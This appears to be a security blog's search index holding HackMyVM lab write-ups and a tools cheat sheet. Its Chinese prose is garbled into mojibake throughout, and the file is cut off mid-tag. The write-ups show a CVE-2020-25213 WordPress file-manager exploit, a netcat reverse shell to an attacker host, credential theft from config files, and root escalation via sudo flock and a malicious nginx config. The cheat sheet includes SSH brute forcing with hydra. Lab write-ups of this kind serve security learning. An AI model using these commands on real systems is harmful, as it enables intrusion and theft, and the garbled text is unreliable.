<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>hackmyvm-vulny</title>
      <link href="/2025/07/03/hackmyvm-vulny/"/>
      <url>/2025/07/03/hackmyvm-vulny/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸€ã€ç«¯å£æ‰«æ"><a href="#ä¸€ã€ç«¯å£æ‰«æ" class="headerlink" title="ä¸€ã€ç«¯å£æ‰«æ"></a>ä¸€ã€ç«¯å£æ‰«æ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.56.106</span><br><span class="line">80/tcp open  http</span><br></pre></td></tr></table></figure><p>åªå¼€æ”¾äº†80ç«¯å£</p><h2 id="äºŒã€ç›®å½•æ‰«æä¸è·¯å¾„æšä¸¾"><a href="#äºŒã€ç›®å½•æ‰«æä¸è·¯å¾„æšä¸¾" class="headerlink" title="äºŒã€ç›®å½•æ‰«æä¸è·¯å¾„æšä¸¾"></a>äºŒã€ç›®å½•æ‰«æä¸è·¯å¾„æšä¸¾</h2><p>ç›´æ¥è®¿é—® <code>http://192.168.56.106</code> æ˜¾ç¤º Ubuntu é»˜è®¤é¡µé¢ã€‚</p><p>ä½¿ç”¨ gobuster æ‰«æï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://192.168.56.106 -w /usr/share/wordlists/dirb/common.txt -x php,txt -t 50</span><br><span class="line"></span><br><span class="line">/secret               (Status: 301)  [Size: 317]  [--&gt; http://192.168.56.106/secret/]</span><br></pre></td></tr></table></figure><p>è¿›ä¸€æ­¥æ‰«æï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://192.168.56.106/secret -w /usr/share/wordlists/dirb/common.txt -x php,txt -t 50</span><br><span class="line"></span><br><span class="line">/wp-admin             (Status: 301) [Size: 326]  [--&gt; http://192.168.56.106/secret/wp-admin/]</span><br><span class="line">/wp-includes          (Status: 301) [Size: 329]  [--&gt; http://192.168.56.106/secret/wp-includes/]</span><br><span class="line">/wp-content           (Status: 301) [Size: 328]  [--&gt; http://192.168.56.106/secret/wp-content/]</span><br><span class="line">/wp-settings.php      (Status: 500) [Size: 0]</span><br></pre></td></tr></table></figure><p>è®¿é—®&#x2F;secretå‘ç°æ˜¯ä¸€ä¸ªwordpressæœåŠ¡ï¼Œå¹¶ä¸”æŠ¥é”™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Neither /etc/wordpress/config-192.168.56.106.php nor /etc/wordpress/config-168.56.106.php could be found.</span><br><span class="line">Ensure one of them exists, is readable by the webserver and contains the right password/username.</span><br></pre></td></tr></table></figure><h2 id="ä¸‰ã€æ’ä»¶æ³„éœ²ä¸æ¼æ´åˆ©ç”¨"><a href="#ä¸‰ã€æ’ä»¶æ³„éœ²ä¸æ¼æ´åˆ©ç”¨" class="headerlink" title="ä¸‰ã€æ’ä»¶æ³„éœ²ä¸æ¼æ´åˆ©ç”¨"></a>ä¸‰ã€æ’ä»¶æ³„éœ²ä¸æ¼æ´åˆ©ç”¨</h2><p>è·Ÿè¿›è®¿é—®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.106/secret/wp-content/uploads/2020/10/</span><br></pre></td></tr></table></figure><p>å‘ç°æ’ä»¶åŒ…å¹¶ä¸”ç¡®å®šç‰ˆæœ¬6.0ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wp-file-manager-6.0.zip</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ WordPress çš„æ’ä»¶ <code>wp-file-manager</code>ï¼Œå­˜åœ¨ CVE-2020-25213ï¼š</p><blockquote><p><code>wp-file-manager &lt;= 6.8</code> å­˜åœ¨æœªæˆæƒæ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œå¯è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚</p></blockquote><p>ä½¿ç”¨ <code>searchsploit</code> æŸ¥æ‰¾æ¼æ´åˆ©ç”¨ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">searchsploit wp-file-manager</span><br><span class="line">searchsploit -m php/webapps/51224.py</span><br><span class="line">python3 51224.py http://192.168.56.106/secret <span class="built_in">id</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br></pre></td></tr></table></figure><p>æ¼æ´åˆ©ç”¨æˆåŠŸï¼Œä¹‹ååå¼¹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 51224.py http://192.168.56.106/secret <span class="string">&quot;busybox nc 192.168.56.102 6666 -e sh&quot;</span></span><br></pre></td></tr></table></figure><h2 id="å››ã€ä¿¡æ¯æ”¶é›†"><a href="#å››ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="å››ã€ä¿¡æ¯æ”¶é›†"></a>å››ã€ä¿¡æ¯æ”¶é›†</h2><p>å‰é¢æŠ¥é”™&#x2F;etc&#x2F;wordpressè·¯å¾„ï¼Œç„¶åçœ‹ä¸€ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">www-data@vulny:/etc/wordpress$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">config-192.168.1.122.php  htaccess</span><br><span class="line">www-data@vulny:/etc/wordpress$ <span class="built_in">cat</span> config-192.168.1.122.php</span><br><span class="line"><span class="built_in">cat</span> config-192.168.1.122.php</span><br><span class="line">&lt;?php</span><br><span class="line">define(<span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;myfuckingpassword&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_COLLATE&#x27;</span>, <span class="string">&#x27;utf8_general_ci&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;WP_CONTENT_DIR&#x27;</span>, <span class="string">&#x27;/usr/share/wordpress/wp-content&#x27;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åçœ‹wordpressçš„é…ç½®æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /usr/share/wordpress/wp-config.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/***</span></span><br><span class="line"><span class="comment"> * WordPress&#x27;s Debianised default master config file</span></span><br><span class="line"><span class="comment"> * Please do NOT edit and learn how the configuration works in</span></span><br><span class="line"><span class="comment"> * /usr/share/doc/wordpress/README.Debian</span></span><br><span class="line"><span class="comment"> ***/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Look up a host-specific config file in</span></span><br><span class="line"><span class="comment"> * /etc/wordpress/config-&lt;host&gt;.php or /etc/wordpress/config-&lt;domain&gt;.php</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$debian_server</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/:.*/&#x27;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>]);</span><br><span class="line"><span class="variable">$debian_server</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[^a-zA-Z0-9.\-]/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$debian_server</span>);</span><br><span class="line"><span class="variable">$debian_file</span> = <span class="string">&#x27;/etc/wordpress/config-&#x27;</span>.<span class="title function_ invoke__">strtolower</span>(<span class="variable">$debian_server</span>).<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"><span class="comment">/* Main site in case of multisite with subdomains */</span></span><br><span class="line"><span class="variable">$debian_main_server</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/^[^.]*\./&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$debian_server</span>);</span><br><span class="line"><span class="variable">$debian_main_file</span> = <span class="string">&#x27;/etc/wordpress/config-&#x27;</span>.<span class="title function_ invoke__">strtolower</span>(<span class="variable">$debian_main_server</span>).<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$debian_file</span>)) &#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="variable">$debian_file</span>);</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DEBIAN_FILE&#x27;</span>, <span class="variable">$debian_file</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$debian_main_file</span>)) &#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="variable">$debian_main_file</span>);</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DEBIAN_FILE&#x27;</span>, <span class="variable">$debian_main_file</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;/etc/wordpress/config-default.php&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;/etc/wordpress/config-default.php&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DEBIAN_FILE&#x27;</span>, <span class="string">&quot;/etc/wordpress/config-default.php&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.0 404 Not Found&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Neither &lt;b&gt;<span class="subst">$debian_file</span>&lt;/b&gt; nor &lt;b&gt;<span class="subst">$debian_main_file</span>&lt;/b&gt; could be found. &lt;br/&gt; Ensure one of them exists, is readable by the webserver and contains the right password/username.&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* idrinksomewater */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Default value for some constants if they have not yet been set</span></span><br><span class="line"><span class="comment">   by the host-specific config files */</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;ABSPATH&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;ABSPATH&#x27;</span>, <span class="string">&#x27;/usr/share/wordpress/&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;WP_CORE_UPDATE&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;WP_CORE_UPDATE&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;WP_ALLOW_MULTISITE&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;WP_ALLOW_MULTISITE&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;DB_NAME&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;DB_USER&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;DB_HOST&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;WP_CONTENT_DIR&#x27;</span>) &amp;&amp; !<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;DONT_SET_WP_CONTENT_DIR&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;WP_CONTENT_DIR&#x27;</span>, <span class="string">&#x27;/var/lib/wordpress/wp-content&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Default value for the table_prefix variable so that it doesn&#x27;t need to</span></span><br><span class="line"><span class="comment">   be put in every host-specific config file */</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$table_prefix</span>)) &#123;</span><br><span class="line">    <span class="variable">$table_prefix</span> = <span class="string">&#x27;wp_&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_PROTO&#x27;</span>]) &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_PROTO&#x27;</span>] == <span class="string">&#x27;https&#x27;</span>)</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTPS&#x27;</span>] = <span class="string">&#x27;on&#x27;</span>;</span><br></pre></td></tr></table></figure><p>æ–‡ä»¶ä¸­æœ‰ä¸ªç‰¹åˆ«æ³¨é‡Šï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* idrinksomewater */</span></span><br></pre></td></tr></table></figure><p>ç»“åˆ&#x2F;homeä¸‹çš„ç”¨æˆ·åä½œä¸ºç™»å½•å‡­æ®</p><h2 id="äº”ã€ææƒ"><a href="#äº”ã€ææƒ" class="headerlink" title="äº”ã€ææƒ"></a>äº”ã€ææƒ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line">(ALL : ALL) NOPASSWD: /usr/bin/flock</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>flock</code> ææƒï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> flock -u / /bin/sh</span><br></pre></td></tr></table></figure><p>flock [é€‰é¡¹] &lt;é”æ–‡ä»¶&gt; &lt;å‘½ä»¤&gt;<br>è¿™é‡Œçš„-u &#x2F;å¹¶ä¸å½±å“ï¼Œé‡è¦çš„æ˜¯rootæƒé™æ‰§è¡Œäº†flockï¼Œç„¶ååé¢é€šè¿‡flockæ‰§è¡Œçš„å‘½ä»¤å°±ä¹Ÿæ˜¯rootæƒé™ã€‚<br>ä»¥rootæƒé™è§£é”æ ¹ç›®å½•å¹¶æ‰§è¡Œ&#x2F;bin&#x2F;shã€‚<br>æˆåŠŸè·å– root shellã€‚</p><h2 id="å…­ã€æ€»ç»“"><a href="#å…­ã€æ€»ç»“" class="headerlink" title="å…­ã€æ€»ç»“"></a>å…­ã€æ€»ç»“</h2><ul><li>æ’ä»¶æ³„éœ² + CVE-2020-25213</li><li>æœåŠ¡çš„é…ç½®æ–‡ä»¶æŸ¥è¯¢</li><li>flockææƒ</li></ul>]]></content>
      
      
      <categories>
          
          <category> é¶æœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é¶æœº </tag>
            
            <tag> hackmyvm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackmyvm-webmaster</title>
      <link href="/2025/07/02/hackmyvm-webmaster/"/>
      <url>/2025/07/02/hackmyvm-webmaster/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸€ã€ä¿¡æ¯æ”¶é›†"><a href="#ä¸€ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸€ã€ä¿¡æ¯æ”¶é›†"></a>ä¸€ã€ä¿¡æ¯æ”¶é›†</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.56.105</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">53/tcp open  domain  Eero device dnsd</span><br><span class="line">80/tcp open  http    nginx 1.14.2</span><br></pre></td></tr></table></figure><p>53 ç«¯å£ä¸º DNS æœåŠ¡ï¼Œ80 ç«¯å£ä¸º nginx Web æœåŠ¡ã€‚</p><h2 id="äºŒã€DNS-Zone-Transfer-ä¿¡æ¯æ³„éœ²"><a href="#äºŒã€DNS-Zone-Transfer-ä¿¡æ¯æ³„éœ²" class="headerlink" title="äºŒã€DNS Zone Transfer ä¿¡æ¯æ³„éœ²"></a>äºŒã€DNS Zone Transfer ä¿¡æ¯æ³„éœ²</h2><p>é¦–å…ˆçœ‹80ç«¯å£</p><p>åˆ©ç”¨ <code>dig</code> å·¥å…·è¿›è¡Œ DNS åŒºåŸŸä¼ é€ï¼ˆAXFRï¼‰æµ‹è¯•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AXFRï¼ˆZone Transferï¼‰æ˜¯ DNS ç”¨äºæŠŠæ•´ä¸ª Zone æ‰¹é‡åŒæ­¥ç»™åˆ«äººçš„åè®®ã€‚</span><br><span class="line">å¦‚æœ DNS ç®¡ç†å‘˜æ²¡åŠ é™åˆ¶ï¼ŒAXFR å°±ç›¸å½“äºè¯´ï¼š</span><br><span class="line">â€œæˆ‘åªè¦çŸ¥é“ä½ å«å•¥åå­—ï¼ˆdomainï¼‰ï¼Œç„¶åæ•²ä¸ªé—¨ï¼ˆdigï¼‰ï¼Œä½ å°±æŠŠä½ å®¶çš„å…¨ä½“æˆå‘˜åå• + å†…ç½‘åœ°å€ + é‚®ä»¶é€šé“éƒ½å‘Šè¯‰æˆ‘ã€‚â€</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">dig @192.168.56.105 webmaster.hmv AXFR +tcp</span><br><span class="line"></span><br><span class="line">webmaster.hmv.      IN SOA   ns1.webmaster.hmv. root.webmaster.hmv. ...</span><br><span class="line">ftp.webmaster.hmv.  IN CNAME www.webmaster.hmv.</span><br><span class="line">john.webmaster.hmv. IN TXT   <span class="string">&quot;Myhiddenpazzword&quot;</span></span><br><span class="line">mail.webmaster.hmv. IN A     192.168.0.12</span><br><span class="line">ns1.webmaster.hmv.  IN A     127.0.0.1</span><br><span class="line">www.webmaster.hmv.  IN A     192.168.0.11</span><br></pre></td></tr></table></figure><p>å‘ç°ï¼š<br><code>john.webmaster.hmv</code> çš„ åŒ…å«ï¼ŒTXT å’Œç–‘ä¼¼å¯†ç  <code>Myhiddenpazzword</code>ï¼Œæµ‹è¯•johnä½œä¸ºç”¨æˆ·å SSH ç™»å½•ã€‚</p><h2 id="ä¸‰ã€SSH-ç™»å½•"><a href="#ä¸‰ã€SSH-ç™»å½•" class="headerlink" title="ä¸‰ã€SSH ç™»å½•"></a>ä¸‰ã€SSH ç™»å½•</h2><p>ä½¿ç”¨ç”¨æˆ·å <code>john</code> å’Œä» DNS TXT è®°å½•è·å¾—çš„å¯†ç å°è¯•ç™»å½• SSHï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh john@192.168.56.105</span><br></pre></td></tr></table></figure><p>æˆåŠŸç™»å½•åï¼Œå‘ç°ç”¨æˆ·å®¶ç›®å½•æœ‰ <code>flag.sh</code>ï¼Œç›´æ¥è¯»flagçš„ï¼Œä½†æ˜¯åªèƒ½è¯»å–æƒé™å†…çš„ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line">(ALL : ALL) NOPASSWD: /usr/sbin/nginx</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯çŸ¥è¯†ç›²åŒºï¼Œä¹‹åçœ‹å¤§ä½¬wpï¼Œè¦å†™nginxæ¶æ„é…ç½®æ–‡ä»¶</p><h2 id="å››ã€åˆ©ç”¨-nginx-é…ç½®ææƒ"><a href="#å››ã€åˆ©ç”¨-nginx-é…ç½®ææƒ" class="headerlink" title="å››ã€åˆ©ç”¨ nginx é…ç½®ææƒ"></a>å››ã€åˆ©ç”¨ nginx é…ç½®ææƒ</h2><p>åˆ›å»ºæ¶æ„ nginx é…ç½®æ–‡ä»¶ <code>nginx.conf</code>ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">user</span> root;</span><br><span class="line"><span class="attribute">worker_processes</span> <span class="number">4</span>;</span><br><span class="line"><span class="attribute">pid</span> /tmp/nginx.pid;</span><br><span class="line"></span><br><span class="line"><span class="section">events</span> &#123;</span><br><span class="line">    <span class="attribute">worker_connections</span> <span class="number">768</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span> <span class="number">1234</span>;</span><br><span class="line">        <span class="attribute">root</span> /;</span><br><span class="line">        <span class="attribute">autoindex</span> <span class="literal">on</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é…ç½®è¯´æ˜ï¼š</p><ul><li>ä»¥ <code>root</code> ç”¨æˆ·å¯åŠ¨ nginx worker è¿›ç¨‹ã€‚</li><li>ç›‘å¬ç«¯å£ <code>1234</code>ã€‚</li><li>æ ¹ç›®å½•è®¾ç½®ä¸ºç³»ç»Ÿæ ¹ç›®å½• <code>/</code>ã€‚</li><li>å¼€å¯ç›®å½•æµè§ˆåŠŸèƒ½ <code>autoindex on</code>ã€‚</li></ul><p>ä½¿ç”¨ sudo æƒé™è¿è¡Œ nginx å¹¶åŠ è½½è¯¥é…ç½®ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> /usr/sbin/nginx -c /home/john/nginx.conf</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.105:1234/root/root.txt</span><br></pre></td></tr></table></figure><p>å³å¯è¯»å– root æƒé™ä¸‹æ•æ„Ÿæ–‡ä»¶ï¼Œå®ç°æ–‡ä»¶æ³„éœ²ã€‚</p><h2 id="äº”ã€æ€»ç»“"><a href="#äº”ã€æ€»ç»“" class="headerlink" title="äº”ã€æ€»ç»“"></a>äº”ã€æ€»ç»“</h2><ul><li>DNS Zone Transfer åˆ©ç”¨</li><li>æ¶æ„ nginx é…ç½®</li></ul>]]></content>
      
      
      <categories>
          
          <category> é¶æœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é¶æœº </tag>
            
            <tag> hackmyvm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tools</title>
      <link href="/2025/07/02/tools/"/>
      <url>/2025/07/02/tools/</url>
      
        <content type="html"><![CDATA[<h2 id="1-gobuster"><a href="#1-gobuster" class="headerlink" title="1.gobuster"></a>1.gobuster</h2><h3 id="1-1-dir"><a href="#1-1-dir" class="headerlink" title="1.1 dir"></a>1.1 dir</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://192.168.56.106 -w /usr/share/wordlists/dirb/common.txt -x php,txt -t 50</span><br></pre></td></tr></table></figure><table><thead><tr><th>å‚æ•°</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>dir</td><td>ç›®å½•æ‰«ææ¨¡å¼</td></tr><tr><td>-u</td><td>æŒ‡å®šç›®æ ‡url</td></tr><tr><td>-w</td><td>æŒ‡å®šå­—å…¸</td></tr><tr><td>-x</td><td>æ·»åŠ æ–‡ä»¶åç¼€å</td></tr><tr><td>-t</td><td>æŒ‡å®šå¹¶å‘æ‰«æçš„çº¿ç¨‹æ•°é‡</td></tr></tbody></table><h2 id="2-hydra"><a href="#2-hydra" class="headerlink" title="2.hydra"></a>2.hydra</h2><p>hydra -L up.txt -p up.txt ssh:&#x2F;&#x2F;192.168.56.104:2222 -V</p><table><thead><tr><th>å‚æ•°</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>-L</td><td>æŒ‡å®šç”¨æˆ·åå­—å…¸</td></tr><tr><td>-l</td><td>æŒ‡å®šç”¨æˆ·å</td></tr><tr><td>-P</td><td>æŒ‡å®šå¯†ç å­—å…¸</td></tr><tr><td>-p</td><td>æŒ‡å®šå¯†ç </td></tr><tr><td>-V</td><td>è¾“å‡ºæ¯ä¸€æ¬¡å°è¯•çˆ†ç ´çš„ç”¨æˆ·åå’Œå¯†ç ä»¥åŠç»“æœ</td></tr></tbody></table><h2 id="3-stegseek"><a href="#3-stegseek" class="headerlink" title="3.stegseek"></a>3.stegseek</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/RickdeJager/stegseek/releases/download/v0.6/stegseek_0.6-1.deb</span><br><span class="line"><span class="built_in">sudo</span> apt install ./stegseek_0.6-1.deb</span><br></pre></td></tr></table></figure><p>kaliæœ€æ–°ç‰ˆæœ¬éœ€è¦å®‰è£…æ—§ä¾èµ–<br>wget <a href="http://archive.debian.org/debian/pool/main/m/mhash/libmhash2_0.9.9.9-7+b1_amd64.deb">http://archive.debian.org/debian/pool/main/m/mhash/libmhash2_0.9.9.9-7+b1_amd64.deb</a><br>wget <a 